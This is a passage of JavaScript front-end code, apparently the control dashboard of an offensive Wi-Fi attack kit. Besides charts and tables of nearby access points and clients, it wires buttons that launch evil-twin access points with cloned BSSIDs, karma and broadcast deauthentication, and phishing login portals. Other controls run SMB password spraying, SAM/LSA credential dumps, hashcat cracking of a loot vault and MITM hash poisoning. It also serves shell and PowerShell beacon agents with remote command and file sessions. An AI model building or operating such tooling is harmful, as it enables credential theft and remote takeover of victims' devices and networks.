    (snap.aps || []).forEach(function (a) {
      var x = clone(a);
      x._live = true;
      map[a.bssid] = x;
      list.push(x);
    });
    (radar.deep || []).forEach(function (d) {
      if (!d || !d.bssid) return;
      var b = String(d.bssid).toUpperCase();
      var cur = map[b];
      if (cur) {
        if ((!cur.ssid || cur.ssid === '[hidden]' || cur.hidden) &&
            d.ssid && d.ssid !== '[hidden]') {
          cur.ssid = d.ssid;
          cur.hidden = false;
        }
        if (!cur.vendor && d.vendor) cur.vendor = d.vendor;
        if (d.security && secGroup(d.security) !== 'OPEN') cur.security = d.security;
        if (d.wps) cur.wps = true;
        if ((cur.signal === null || cur.signal === undefined) && d.signal != null) {
          cur.signal = d.signal;
        }
        cur._deep = true;
      } else {
        var x = clone(d);
        x.bssid = b;
        x.hidden = !d.ssid || d.ssid === '[hidden]';
        x.frames = 0;
        x.clients = 0;
        x.beacons = 0;
        x._deep = true;
        map[b] = x;
        list.push(x);
      }
    });
    list.sort(function (a, b) {
      return ((b.signal == null ? -1000 : b.signal) -
              (a.signal == null ? -1000 : a.signal));
    });
    return list;
  }

  function kpi(id, value, sub) {
    var v = $(id);
    if (v) v.textContent = value;
    if (sub && $(id + '-s')) $(id + '-s').textContent = sub;
  }

  function renderReconHead() {
    var s = radar.snap;
    var pill = $('recon-state');
    var btn = $('btn-radar-toggle');
    if (!s) {
      pill.className = 'recon-pill idle';
      pill.textContent = 'RADAR OFFLINE';
      $('recon-iface').textContent = 'iface —';
      $('recon-uptime').textContent = 'uptime —';
      $('recon-last').textContent = 'last frame —';
      return;
    }
    var active = !!s.active;
    var armed = !!s.armed;
    var running = !!s.running;
    var text, cls;
    if (!active) { text = 'RADAR PAUSED'; cls = 'idle'; }
    else if (armed) { text = 'RADAR ARMED'; cls = 'armed'; }
    else if (!running) { text = 'RADAR STARTING'; cls = 'idle'; }
    else { text = 'LIVE · ' + (s.hop ? 'HOPPING' : 'PINNED'); cls = 'live'; }
    pill.className = 'recon-pill ' + cls;
    pill.textContent = text;

    btn.textContent = active ? 'PAUSE RADAR' : 'RESUME RADAR';
    $('recon-hop').checked = !!s.hop;
    if (s.dwell && String($('recon-dwell').value) !== String(Math.round(s.dwell))) {
      var opt = $('recon-dwell').querySelector('option[value="' + Math.round(s.dwell) + '"]');
      if (opt) $('recon-dwell').value = opt.value;
    }

    var now = Date.now() / 1000;
    var iface = s.iface || s.bound || s.radio && s.radio.iface || '—';
    $('recon-iface').textContent = 'iface ' + (iface || '—');
    $('recon-uptime').textContent = s.uptime ? 'up ' + ago(s.uptime) : 'uptime —';
    if (s.error) {
      $('recon-last').textContent = s.error;
    } else if (s.last_frame) {
      $('recon-last').textContent = 'last frame ' + ago(Math.max(0, now - s.last_frame)) + ' ago';
    } else {
      $('recon-last').textContent = 'no frames yet';
    }
  }

  function renderReconKpis() {
    var s = radar.snap;
    if (!s) return;
    var c = s.counts || {};
    var b = s.breakdown || {};
    kpi('kpi-aps', c.aps || 0,
        (b.hidden || 0) + ' hidden · ' + (b.open || 0) + ' open');
    kpi('kpi-clients', c.clients || 0,
        (b.randomized || 0) + ' randomized MACs');
    kpi('kpi-devices', c.devices || 0, (c.probes || 0) + ' probe SSIDs');
    kpi('kpi-pps', compact((s.rate || {}).packets || 0), '3s average');
    kpi('kpi-eps', compact((s.rate || {}).events || 0), 'live event rate');
    kpi('kpi-frames', compact(c.frames || 0), bytes(c.bytes || 0));
    kpi('kpi-eapol', compact(c.eapol || 0), 'handshake frames');
    kpi('kpi-deauth', compact(c.deauth || 0), (c.errors || 0) + ' bad FCS');
  }

  function bandColor(band) {
    band = String(band || '');
    if (band.indexOf('5') === 0) return '#5fd0ff';
    if (band.indexOf('6') === 0) return '#c084fc';
    return '#ff5c5c';
  }

  function renderReconCharts() {
    var s = radar.snap;
    if (!s || !window.MChart) return;
    var C = MChart.COLORS;
    var ser = s.series || {};

    MChart.line($('chart-traffic'), {
      labels: ser.times || [],
      series: [
        { name: 'total', color: C.red, data: ser.total || [], width: 2, fill: true, glow: true },
        { name: 'mgmt', color: C.amber, data: ser.mgmt || [] },
        { name: 'data', color: C.cyan, data: ser.data || [] },
        { name: 'ctrl', color: C.violet, data: ser.ctrl || [] }
      ]
    });

    MChart.line($('chart-events'), {
      labels: ser.times || [],
      series: [
        { name: 'probes', color: C.cyan, data: ser.probe || [] },
        { name: 'auth', color: C.amber, data: ser.auth || [] },
        { name: 'assoc', color: C.violet, data: ser.assoc || [] },
        { name: 'deauth', color: C.red, data: ser.deauth || [], fill: true }
      ]
    });

    var chans = (s.channels || []).sort(function (a, b) { return Number(a.ch) - Number(b.ch); });
    channelData = chans;
    drawChannelChart($('chart-channels'));

    var ss = s.survey_series || {};
    var busy = ss.busy || [], rx = ss.rx || [], tx = ss.tx || [];
    var n = Math.max(busy.length, rx.length, tx.length);
    if (n && busy.length < n) {
      while (busy.length < n) busy.unshift(0);
      while (rx.length < n) rx.unshift(0);
      while (tx.length < n) tx.unshift(0);
    }
    var hasSurvey = busy.concat(rx, tx).some(function (v) { return Number(v) > 0; });
    var note = $('recon-survey-note');
    if (note) note.textContent = hasSurvey ? '' : 'no air-time counters from this driver';
    MChart.line($('chart-radio'), {
      max: 100,
      series: [
        { name: 'busy', color: C.cyan, data: busy, fill: true, width: 2 },
        { name: 'rx', color: C.amber, data: rx },
        { name: 'tx', color: C.violet, data: tx }
      ]
    });
  }

  /* --- Channel activity chart + hover tooltip ------------------------------ */

  var channelData = [];
  var channelHoverIdx = -1;
  var channelTooltipReady = false;

  function drawChannelChart(cv) {
    if (!cv) return;
    MChart.bars(cv, {
      labels: channelData.map(function (c) { return c.ch; }),
      values: channelData.map(function (c) { return c.total || 0; }),
      colors: channelData.map(function (c) { return bandColor(c.band); }),
      logScale: true,
      showValues: false,
      highlight: channelHoverIdx
    });
  }

  function channelKey(v) {
    var n = Number(v);
    return isFinite(n) && n > 0 ? n : 0;
  }

  function channelCounts(snap) {
    var aps = {}, clients = {};
    ((snap && snap.aps) || []).forEach(function (a) {
      var k = channelKey(a.channel);
      if (k) aps[k] = (aps[k] || 0) + 1;
    });
    ((snap && snap.clients) || []).forEach(function (c) {
      var k = channelKey(c.channel);
      if (k) clients[k] = (clients[k] || 0) + 1;
    });
    return { aps: aps, clients: clients };
  }

  /* --- Generic hover readout for line charts ------------------------------- */
  var lineHoverReady = false;
  var lineHoverIds = [
    'chart-traffic', 'chart-events', 'chart-radio', 'chart-db-traffic',
    'chart-mon-events', 'chart-atk-timeline', 'chart-lat-timeline',
    'chart-mitm-timeline', 'chart-loot-timeline', 'chart-alert-timeline'
  ];

  function clockText(sec) {
    var d = new Date(Number(sec) * 1000);
    if (isNaN(d.getTime())) return '';
    var p = function (n) { return (n < 10 ? '0' : '') + n; };
    return p(d.getHours()) + ':' + p(d.getMinutes()) + ':' + p(d.getSeconds());
  }

  function initLineHovers() {
    if (lineHoverReady) return;
    lineHoverReady = true;
    var tip = document.createElement('div');
    tip.id = 'line-tooltip';
    tip.className = 'chart-tooltip';
    document.body.appendChild(tip);

    lineHoverIds.forEach(function (id) {
      var cv = $(id);
      if (!cv) return;
      cv.addEventListener('mousemove', function (e) {
        var series = cv._series || [];
        if (!series.length) { tip.style.display = 'none'; return; }
        var rect = cv.getBoundingClientRect();
        var padL = 38;
        var pw = rect.width - padL - 10;
        var x = e.clientX - rect.left;
        var n = 0;
        series.forEach(function (sr) { n = Math.max(n, sr.data.length); });
        if (n < 1 || pw <= 0 || x < padL || x > padL + pw) {
          tip.style.display = 'none';
          return;
        }
        var idx = Math.round((x - padL) / pw * (n - 1));
        idx = Math.max(0, Math.min(n - 1, idx));
        var labels = cv._labels || [];
        var head = labels.length
          ? clockText(labels[Math.min(idx, labels.length - 1)])
          : 'sample ' + (idx + 1) + ' / ' + n;
        var rows = series.map(function (sr) {
          var off = n - sr.data.length;
          var v = (idx >= off) ? sr.data[idx - off] : 0;
          return '<div class="tt-row"><i style="background:' + sr.color + '"></i>' +
            '<span>' + esc(sr.name || '') + '</span><b>' + compact(v) + '</b></div>';
        }).join('');
        tip.innerHTML = '<div class="tt-h">' + esc(head) + '</div>' + rows;
        tip.style.display = 'block';
        var left = e.clientX + 16;
        if (left + 220 > window.innerWidth) left = e.clientX - 236;
        tip.style.left = Math.max(6, left) + 'px';
        tip.style.top = Math.max(8, e.clientY - 14) + 'px';
      });
      cv.addEventListener('mouseleave', function () { tip.style.display = 'none'; });
    });
  }

  function initChannelTooltip() {
    if (channelTooltipReady) return;
    var cv = $('chart-channels');
    if (!cv) return;
    channelTooltipReady = true;

    var tip = document.createElement('div');
    tip.id = 'chart-tooltip';
    tip.className = 'chart-tooltip';
    document.body.appendChild(tip);

    var activeIdx = -1;

    function hide() {
      tip.style.display = 'none';
      activeIdx = -1;
      if (channelHoverIdx !== -1) {
        channelHoverIdx = -1;
        drawChannelChart(cv);
      }
    }

    cv.addEventListener('mousemove', function (e) {
      if (!channelData.length) { hide(); return; }

      var rect = cv.getBoundingClientRect();
      var padL = 38, padR = 10;
      var pw = rect.width - padL - padR;
      var n = channelData.length;
      if (pw <= 0 || n <= 0) { hide(); return; }

      var x = e.clientX - rect.left;
      var y = e.clientY - rect.top;
      var slot = pw / n;
      var idx = Math.floor((x - padL) / slot);

      // only respond inside the plot area and over a real bar slot
      if (idx < 0 || idx >= n || x < padL || x > padL + pw ||
          y < 0 || y > rect.height) {
        hide();
        return;
      }

      var c = channelData[idx];
      if (!c) { hide(); return; }

      if (idx !== activeIdx) {
        activeIdx = idx;
        channelHoverIdx = idx;
        drawChannelChart(cv);
        var snap = radar.snap || {};
        var counts = channelCounts(snap);
        var ch = Number(c.ch);
        var apN = counts.aps[ch] || 0;
        var cliN = counts.clients[ch] || 0;
        var tuned = channelKey((snap.radio || {}).channel);
        var seen = Number(c.last);
        var sum = 0;
        for (var k = 0; k < channelData.length; k++) sum += Number(channelData[k].total) || 0;
        var share = sum > 0 ? (Number(c.total) || 0) / sum * 100 : 0;

        tip.innerHTML =
          '<div class="tooltip-header">Channel ' + esc(String(c.ch)) +
            (ch === tuned ? ' &middot; live' : '') + '</div>' +
          '<div class="tooltip-row"><span class="label">Band</span>' +
            '<span class="value">' + esc(c.band || '\u2014') + '</span></div>' +
          '<div class="tooltip-row"><span class="label">Frames</span>' +
            '<span class="value hot">' + compact(c.total || 0) + '</span></div>' +
          '<div class="tooltip-row"><span class="label">Share</span>' +
            '<span class="value">' + share.toFixed(1) + '%</span></div>' +
          '<div class="tooltip-row"><span class="label">Rate</span>' +
            '<span class="value">' + (Number(c.pps) || 0).toFixed(1) + ' pkt/s</span></div>' +
          '<div class="tooltip-row"><span class="label">APs</span>' +
            '<span class="value">' + apN + '</span></div>' +
          '<div class="tooltip-row"><span class="label">Clients</span>' +
            '<span class="value">' + cliN + '</span></div>' +
          '<div class="tooltip-row"><span class="label">Last frame</span>' +
            '<span class="value">' + (seen > 0 ? ago(Date.now() / 1000 - seen) + ' ago' : 'never') +
            '</span></div>';
      }

      tip.style.display = 'block';
      var tw = tip.offsetWidth || 200;
      var th = tip.offsetHeight || 110;
      var left = e.pageX + 16;
      var top = e.pageY - 12;
      if (left + tw > window.scrollX + document.documentElement.clientWidth - 8) {
        left = e.pageX - tw - 16;
      }
      if (top + th > window.scrollY + document.documentElement.clientHeight - 8) {
        top = window.scrollY + document.documentElement.clientHeight - th - 8;
      }
      if (top < window.scrollY + 8) top = window.scrollY + 8;
      tip.style.left = Math.max(window.scrollX + 8, left) + 'px';
      tip.style.top = top + 'px';
    });

    cv.addEventListener('mouseleave', hide);
    cv.addEventListener('blur', hide);
  }

  function renderReconRadio() {
    var s = radar.snap;
    if (!s) return;
    var r = s.radio || {};
    var rows = [
      ['interface', r.iface || s.iface || '—'],
      ['mode', r.mode ? String(r.mode).toUpperCase() : '—'],
      ['mac', r.mac || '—'],
      ['channel', r.channel ? ('ch ' + r.channel +
        (r.freq ? ' · ' + r.freq + ' MHz' : '') +
        (r.width ? ' · ' + r.width : '')) : '—'],
      ['band', r.band || '—'],
      ['phy/driver', ((r.phy || '—') + (r.driver ? ' · ' + r.driver : ''))],
      ['tx power', r.txpower ? r.txpower + ' dBm' : '—'],
      ['regdomain', r.regdom || '—'],
      ['kernel', r.kernel || '—']
    ];
    if (r.error || s.error) rows.push(['error', r.error || s.error]);
    $('recon-radio').innerHTML = rows.map(function (x) {
      return '<div class="k">' + esc(x[0]) + '</div><div class="v">' + esc(x[1]) + '</div>';
    }).join('');

    var tb = $('tbl-survey').querySelector('tbody');
    var survey = (s.survey || []).slice().sort(function (a, b) {
      return (b.busy_pct || 0) - (a.busy_pct || 0);
    }).slice(0, 12);
    if (!survey.length) {
      tb.innerHTML = '<tr><td colspan="7" class="empty">Survey data unavailable — driver does not expose channel time</td></tr>';
      return;
    }
    var tuned = String(r.channel || s.radio && s.radio.channel || '');
    tb.innerHTML = survey.map(function (e) {
      var inUse = e.in_use || String(e.ch) === tuned;
      return '<tr><td>' + esc(e.ch || '?') + '</td><td>' + esc(e.band || '—') +
        '</td><td>' + esc((e.busy_pct || 0).toFixed(1)) + '%</td><td>' +
        esc((e.rx_pct || 0).toFixed(1)) + '%</td><td>' +
        esc((e.tx_pct || 0).toFixed(1)) + '%</td><td>' +
        (e.noise == null ? '—' : esc(e.noise) + ' dBm') + '</td><td>' +
        (inUse ? '<span class="sec-badge wpa3">TUNED</span>' : '<span class="hint">—</span>') +
        '</td></tr>';
    }).join('');
  }

  function legendHtml(segs) {
    return segs.map(function (x) {
      return '<span><i style="background:' + x.color + '"></i>' +
        esc(x.label) + ' · ' + esc(x.value) + '</span>';
    }).join('');
  }

  function renderReconBreakdown() {
    var s = radar.snap;
    if (!s) return;
    var b = s.breakdown || {};
    var bands = b.bands || {};
    var sec = b.security || {};

    var bandSegs = Object.keys(bands).sort().map(function (k) {
      return { label: k, value: bands[k], color: bandColor(k) };
    });
    if (!bandSegs.length) bandSegs = [{ label: 'none', value: 0, color: '#3a1d23' }];
    $('legend-bands').innerHTML = legendHtml(bandSegs.filter(function (x) { return x.value; }));
    MChart.donut($('chart-bands'), {
      segments: bandSegs,
      center: s.counts && s.counts.aps || 0,
      sub: 'APs'
    });

    var groups = { OPEN: 0, WEP: 0, WPA: 0, WPA2: 0, WPA3: 0 };
    Object.keys(sec).forEach(function (k) { groups[secGroup(k)] += sec[k]; });
    var secColors = { OPEN: '#ff5140', WEP: '#ffb454', WPA: '#7cffb2',
                      WPA2: '#5fd0ff', WPA3: '#c084fc' };
    var secSegs = Object.keys(groups).map(function (k) {
      return { label: k, value: groups[k], color: secColors[k] };
    });
    $('legend-security').innerHTML = legendHtml(secSegs.filter(function (x) { return x.value; }));
    MChart.donut($('chart-security'), {
      segments: secSegs,
      center: (b.open || 0) + (b.wpa3 || 0) ? ((b.open || 0) + ' / ' + (b.wpa3 || 0)) : '0 / 0',
      sub: 'open / WPA3'
    });

    var stats = [
      ['hidden', b.hidden || 0], ['wps', b.wps || 0],
      ['open', b.open || 0], ['wpa3', b.wpa3 || 0],
      ['random', b.randomized || 0], ['eapol', s.counts && s.counts.eapol || 0],
      ['retry', b.frame_mix && b.frame_mix.retry || 0],
      ['deauth', b.frame_mix && b.frame_mix.deauth || 0]
    ];
    $('bd-stats').innerHTML = stats.map(function (x) {
      return '<div class="bd-stat"><b>' + esc(compact(x[1])) + '</b><span>' +
        esc(x[0]) + '</span></div>';
    }).join('');

    var vendors = b.vendors || [];
    $('vendor-list').innerHTML = vendors.length ? vendors.map(function (v) {
      return '<div class="vendor-row"><span>' + esc(v.name || '?') +
        '</span><span>' + esc(v.count) + '</span></div>';
    }).join('') : '<div class="empty" style="padding:12px">No client vendors seen yet</div>';
  }

  function reconFilter() {
    return ($('recon-filter').value || '').trim().toLowerCase();
  }

  function reconMatch(o, q) {
    if (!q) return true;
    return [o.ssid, o.bssid, o.mac, o.vendor, o.security, o.channel, o.band]
      .some(function (v) { return String(v == null ? '' : v).toLowerCase().indexOf(q) >= 0; });
  }

  function renderReconAps() {
    var tb = $('tbl-wifi').querySelector('tbody');
    var q = reconFilter();
    var list = mergedAps().filter(function (a) { return reconMatch(a, q); });
    if (!list.length) {
      tb.innerHTML = '<tr><td colspan="11" class="empty">' +
        (radar.snap && (radar.snap.aps || []).length
          ? 'No AP matches the filter'
          : 'Listening for beacons…') + '</td></tr>';
      return;
    }
    tb.innerHTML = list.map(function (ap) {
      var ssid = ap.hidden ? '' : (ap.ssid || '');
      var bssid = esc(ap.bssid || '');
      var ch = esc(ap.channel || '?');
      var label = ap.hidden ? '<span class="hint">[hidden]</span>' : esc(ap.ssid || '');
      var flags = [];
      if (ap.wps) flags.push('<span class="sec-badge wep">WPS</span>');
      if (ap._deep && !ap._live) flags.push('<span class="sec-badge wpa3">SCAN</span>');
      return '<tr><td>' + label + '</td><td><code>' + bssid + '</code></td><td>' +
        esc(ap.vendor || '—') + '</td><td>' + ch + '</td><td>' + esc(ap.band || '—') +
        '</td><td>' + sigHtml(ap.signal) + '</td><td>' + secBadge(ap.security) +
        (flags.length ? ' ' + flags.join(' ') : '') + '</td><td>' + esc(ap.clients || 0) + '</td><td>' +
        (ap.frames ? esc(compact(ap.frames)) : '—') + '</td><td>' +
        (ap.age != null ? esc(ago(ap.age)) : 'scan') + '</td>' +
        '<td><div class="row-actions">' +
        '<button class="btn" data-use="' + bssid + '" data-ssid="' + esc(ssid) +
        '" data-ch="' + ch + '">USE</button>' +
        '<button class="btn" data-harvest="passive" data-use="' + bssid +
        '" data-ssid="' + esc(ssid) + '" data-ch="' + ch + '">PASSIVE</button>' +
        '<button class="btn" data-harvest="active" data-use="' + bssid +
        '" data-ssid="' + esc(ssid) + '" data-ch="' + ch + '">ACTIVE</button>' +
        '</div></td></tr>';
    }).join('');
  }

  function renderReconClients() {
    var tb = $('tbl-clients').querySelector('tbody');
    var snap = radar.snap || {};
    var q = reconFilter();
    var list = (snap.clients || []).filter(function (c) { return reconMatch(c, q); });
    if (!list.length) {
      tb.innerHTML = '<tr><td colspan="10" class="empty">No clients captured yet</td></tr>';
      return;
    }
    tb.innerHTML = list.map(function (c) {
      var mac = esc(c.mac || '—');
      var tags = c.randomized ? ' <span class="sec-badge open">RND</span>' : '';
      return '<tr><td><code>' + mac + '</code></td><td>' + esc(c.vendor || '—') + tags +
        '</td><td>' + esc(c.ssid || '—') + '</td><td>' + esc(c.channel || '?') +
        '</td><td>' + sigHtml(c.signal) + '</td><td>' + esc(compact(c.frames)) +
        '</td><td>' + esc(compact(c.data)) + '</td><td>' +
        esc((c.probes || []).length) + '</td><td>' + esc(ago(c.age)) + '</td>' +
        '<td><button class="btn" data-copy="' + mac + '" style="padding:4px 7px;font-size:10px">COPY</button></td></tr>';
    }).join('');
  }

  function renderReconProbes() {
    var tb = $('tbl-radar-probes').querySelector('tbody');
    var list = (radar.snap && radar.snap.probes) || [];
    if (!list.length) {
      tb.innerHTML = '<tr><td colspan="5" class="empty">No probe requests yet</td></tr>';
      return;
    }
    tb.innerHTML = list.map(function (p) {
      return '<tr><td>' + esc(p.ssid || '[wildcard]') + '</td><td>' + esc(p.clients || 0) +
        '</td><td>' + esc(p.count || 0) + '</td><td>' + esc(p.channel || '?') +
        '</td><td>' + esc(ago(p.age)) + '</td></tr>';
    }).join('');
  }

  function renderReconFeed() {
    var box = $('radar-feed');
    var list = (radar.snap && radar.snap.events) || [];
    if (!list.length) {
      box.innerHTML = '<div class="empty">Waiting for frames…</div>';
      return;
    }
    box.innerHTML = list.slice(0, 44).map(function (e) {
      var kind = String(e.kind || 'EVENT').toUpperCase();
      var detail = [];
      if (e.src) detail.push(e.src);
      if (e.dst) detail.push('→ ' + e.dst);
      if (e.ch) detail.push('ch ' + e.ch);
      if (e.signal != null) detail.push(e.signal + ' dBm');
      if (e.detail) detail.push(e.detail);
      return '<div class="feed-line"><span class="t">' + esc(e.ts || '') +
        '</span><span class="feed-kind k-' + esc(kind) + '">' + esc(kind) +
        '</span><span class="d" title="' + esc(detail.join(' · ')) + '">' +
        esc(detail.join(' · ')) + '</span></div>';
    }).join('');
  }

  function renderRecon() {
    if (!radar.snap) {
      renderReconHead();
      return;
    }
    renderReconHead();
    renderReconKpis();
    renderReconCharts();
    renderReconRadio();
    renderReconBreakdown();
    renderReconAps();
    renderReconClients();
    renderReconProbes();
    renderReconFeed();
  }

  function radarPoll(force) {
    var now = Date.now();
    if (!force && now - radar.pollAt < 900) return;
    radar.pollAt = now;
    apiGet('radar').then(function (r) {
      if (r && r.ok) {
        radar.snap = r;
        updateTopStats(r);
        if (cur === 'recon') renderRecon();
        if (cur === 'dashboard') renderDashboardCharts();
        if (cur === 'monitor') renderMonitorCharts();
      }
    });
  }

  function updateTopStats(r) {
    if (!$('top-channel')) return;
    var radio = (r && r.radio) || {};
    var rate = (r && r.rate) || {};
    $('top-channel').textContent = radio.channel ? ('CH ' + radio.channel) : '—';
    $('top-pps').textContent = (Number(rate.packets) || 0).toFixed(0);
    $('top-eps').textContent = (Number(rate.events) || 0).toFixed(0);
    if ($('side-uptime') && r && r.uptime) $('side-uptime').textContent = ago(r.uptime);
  }

  function radarCmd(params) {
    return apiGet('radar_cmd', params).then(function (r) {
      if (r && r.ok) {
        radar.snap = r;
        renderRecon();
      } else {
        toast('Radar: ' + ((r && r.error) || 'command failed'), true);
      }
      return r;
    });
  }

  $('btn-radar-toggle').addEventListener('click', function () {
    var on = radar.snap ? (radar.snap.active ? 0 : 1) : 1;
    radarCmd({ on: on }).then(function (r) {
      if (r && r.ok) toast(on ? 'Radar resumed' : 'Radar paused');
    });
  });

  $('recon-hop').addEventListener('change', function () {
    var on = this.checked ? 1 : 0;
    radarCmd({ hop: on }).then(function (r) {
      if (r && r.ok) toast('Radar hopping ' + (on ? 'enabled — karma yields' : 'disabled'));
    });
  });

  $('recon-dwell').addEventListener('change', function () {
    radarCmd({ dwell: this.value });
  });

  $('btn-radar-reset').addEventListener('click', function () {
    radarCmd({ reset: 1 }).then(function (r) {
      if (r && r.ok) toast('Radar inventory cleared');
    });
  });

  $('recon-filter').addEventListener('input', function () {
    renderReconAps();
    renderReconClients();
  });

  function harvest(ap, mode) {
    if (!ap.ssid) { toast('Cannot harvest a hidden network without an SSID', true); return; }
    var active = (mode === 'active');
    var params = {
      ssid: ap.ssid,
      bssid: ap.bssid,
      channel: ap.channel,
      portal_mode: 'open',
      psk: '',
      clone_bssid: ap.bssid ? '1' : '0',
      wpa3_transition: '0',
      deauth_mode: active ? 'broadcast' : 'off',
      burst: '25',
      delay: '1',
      continuous: '1',
      template: $('cfg-template').value || 'wifi_login',
      capture_mode: 'both',
      karma: '1',
      shield_after_capture: '0'
    };
    apiGet('start', params).then(function (s) {
      if (s.ok) {
        toast('Harvest ' + mode + ' armed on ' + ap.ssid + ' (ch ' + ap.channel + ')');
        dirty = {};
        statusPoll();
      } else {
        toast('Harvest failed: ' + (s.error || '?'), true);
      }
    });
  }

  $('tbl-wifi').addEventListener('click', function (e) {
    var b = e.target.closest ? e.target.closest('button') : null;
    if (!b) return;
    var ssid = b.getAttribute('data-ssid') || '';
    var bssid = b.getAttribute('data-use') || '';
    var ch = b.getAttribute('data-ch') || '6';
    var mode = b.getAttribute('data-harvest');
    if (mode) {
      harvest({ ssid: ssid, bssid: bssid, channel: ch }, mode);
      return;
    }
    if (!b.hasAttribute('data-use')) return;
    $('cfg-ssid').value = ssid;
    $('cfg-bssid').value = bssid;
    $('cfg-channel').value = ch;
    markDirty('cfg-ssid'); markDirty('cfg-bssid'); markDirty('cfg-channel');
    setView('attack');
    toast('Target loaded from recon: ' + (ssid || bssid));
  });

  $('tbl-clients').addEventListener('click', function (e) {
    var b = e.target.closest ? e.target.closest('button[data-copy]') : null;
    if (!b) return;
    var mac = b.getAttribute('data-copy') || '';
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(mac).then(function () {
        toast('Copied ' + mac);
      }, function () { toast('Copy failed', true); });
    } else {
      var t = document.createElement('textarea');
      t.value = mac;
      document.body.appendChild(t);
      t.select();
      try { document.execCommand('copy'); toast('Copied ' + mac); }
      catch (err) { toast('Copy failed', true); }
      t.remove();
    }
  });

  function runWifiScan() {
    if (wifi.running) { toast('Wi-Fi scan already running', true); return; }
    wifi.running = true;
    $('wifi-scan-state').textContent = 'Deep scanning… (managed scan, up to ~15s)';
    apiGet('scan').then(function (r) {
      wifi.running = false;
      if (r && r.ok) {
        wifi.aps = r.aps || [];
        wifi.iface = r.iface || '';
        wifi.ts = r.ts || '';
        radar.deep = r.aps || [];
        radar.deepAt = Date.now();
        var extra = Math.max(0, radar.deep.length -
          ((radar.snap && radar.snap.aps) || []).length);
        $('wifi-scan-state').textContent =
          radar.deep.length + ' APs via ' + (wifi.iface || '?') +
          (extra ? ' (+' + extra + ' new)' : '') + ' — merged into radar';
        renderRecon();
        toast('Deep scan merged: ' + radar.deep.length + ' APs');
      } else {
        $('wifi-scan-state').textContent = 'Deep scan failed';
        toast('Wi-Fi recon failed: ' + ((r && r.error) || '?'), true);
      }
    });
  }
  $('btn-wifi-scan').addEventListener('click', runWifiScan);

  // Rogue-subnet quick target: locks the nmap target onto the /24 the rogue
  // AP itself serves (victims connected to the portal).
  $('scan-rogue').addEventListener('change', function () {
    var t = $('scan-target');
    if (this.checked) {
      t.dataset.prev = t.value;
      t.value = (state && state.sys && state.sys.portal_net) || '172.16.52.0/24';
      t.disabled = true;
      toast('Target locked to the rogue subnet: ' + t.value);
    } else {
      t.disabled = false;
      if (typeof t.dataset.prev === 'string') t.value = t.dataset.prev;
    }
  });

  $('spray-cred').addEventListener('change', function () {
    $('spray-manual').style.display = (this.value === 'manual') ? '' : 'none';
  });

  $('btn-spray-run').addEventListener('click', function () {
    var protos = Array.prototype.map.call(document.querySelectorAll('.spray-proto:checked'),
      function (c) { return c.value; }).join(',') || 'smb';
    var params = {
      targets: $('spray-targets').value.trim(),
      protos: protos,
      limit: $('spray-limit').value || '15'
    };
    if ($('spray-cred').value === 'manual') {
      params.user = $('spray-user').value.trim();
      params.pass = $('spray-pass').value.trim();
    }
    if (!params.targets) { toast('Set spray targets (CIDR or IPs)', true); return; }
    $('spray-state').textContent = 'Spraying…';
    apiGet('spray', params).then(function (r) {
      if (r.ok) toast('Spray queued: ' + r.attempts + ' attempts');
      else { toast('Spray failed: ' + (r.error || '?'), true); $('spray-state').textContent = 'Idle'; }
      opsPoll();
    });
  });

  // --- SAM/LSA dump + hash crack -----------------------------------------------
  $('btn-dump-run').addEventListener('click', function () {
    var kind = document.querySelector('input[name="dump-kind"]:checked');
    var params = {
      targets: $('spray-targets').value.trim(),
      kind: (kind && kind.value) || 'sam'
    };
    if ($('spray-cred').value === 'manual') {
      params.user = $('spray-user').value.trim();
      params.pass = $('spray-pass').value.trim();
    }
    if (!params.targets) { toast('Set Lateral targets first (CIDR or IPs)', true); return; }
    $('dump-state').textContent = 'Dumping…';
    apiGet('dump', params).then(function (r) {
      if (r.ok) toast(params.kind.toUpperCase() + ' dump queued: ' + params.targets);
      else { toast('Dump failed: ' + (r.error || '?'), true); $('dump-state').textContent = 'Idle'; }
      opsPoll();
    });
  });

  $('btn-crack-run').addEventListener('click', function () {
    $('crack-state').textContent = 'hashcat running against the vault…';
    apiGet('crack').then(function (r) {
      if (r.ok) toast('Hash crack queued — results land in the vault');
      else { toast('Crack failed: ' + (r.error || '?'), true); $('crack-state').textContent = 'hashcat against the vault (NTLMv2 + NT)'; }
      opsPoll();
    });
  });

  $('btn-mitm').addEventListener('click', function () {
    var on = !!ops.mitm.running;
    var params = { on: on ? '0' : '1' };
    apiGet('mitm', params).then(function (r) {
      if (r.ok) toast(on ? 'Poisoning disarmed' : 'Poisoning armed — hashes incoming');
      else toast('MITM toggle failed: ' + (r.error || '?'), true);
      opsPoll();
    });
  });

  function copyText(txt) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      return navigator.clipboard.writeText(txt).then(function () { toast('Copied to clipboard'); });
    }
    var ta = document.createElement('textarea');
    ta.value = txt;
    document.body.appendChild(ta);
    ta.select();
    try { document.execCommand('copy'); toast('Copied to clipboard'); } catch (e) { toast('Copy failed', true); }
    ta.remove();
  }

  $('cfg-beacon').addEventListener('change', function () {
    apiGet('beacon', { on: this.checked ? '1' : '0' }).then(function (r) {
      if (r.ok) { toast(r.on ? 'Beacon armed — serve /beacon to a target' : 'Beacon disarmed'); opsPoll(); }
      else toast('Beacon toggle failed: ' + (r.error || '?'), true);
    });
  });

  $('btn-copy-sh').addEventListener('click', function () {
    fetch(API + '?' + qs({ action: 'beacon_payload', token: session.sid || '', kind: 'sh' }))
      .then(function (r) { return r.text(); }).then(copyText);
  });
  $('btn-copy-ps1').addEventListener('click', function () {
    fetch(API + '?' + qs({ action: 'beacon_payload', token: session.sid || '', kind: 'ps1' }))
      .then(function (r) { return r.text(); }).then(copyText);
  });
  $('btn-dl-sh').addEventListener('click', function () {
    downloadUrl(API + '?' + qs({ action: 'beacon_payload', token: session.sid || '', kind: 'sh' }), 'malstrom-agent.sh');
  });
  $('btn-dl-ps1').addEventListener('click', function () {
    downloadUrl(API + '?' + qs({ action: 'beacon_payload', token: session.sid || '', kind: 'ps1' }), 'malstrom-agent.ps1');
  });
  $('btn-sess-cmd').addEventListener('click', sendSessCmd);
  $('sess-cmd').addEventListener('keydown', function (e) { if (e.key === 'Enter') sendSessCmd(); });
  $('sess-select').addEventListener('change', renderSessions);

  function sendSessFile() {
    var sid = $('sess-select').value || sessSel;
    var path = $('sess-file').value.trim();
    if (!sid) { toast('No session selected', true); return; }
    if (!path) { toast('Type a remote path', true); return; }
    apiGet('beacon_file', { sid: sid, path: path }).then(function (r) {
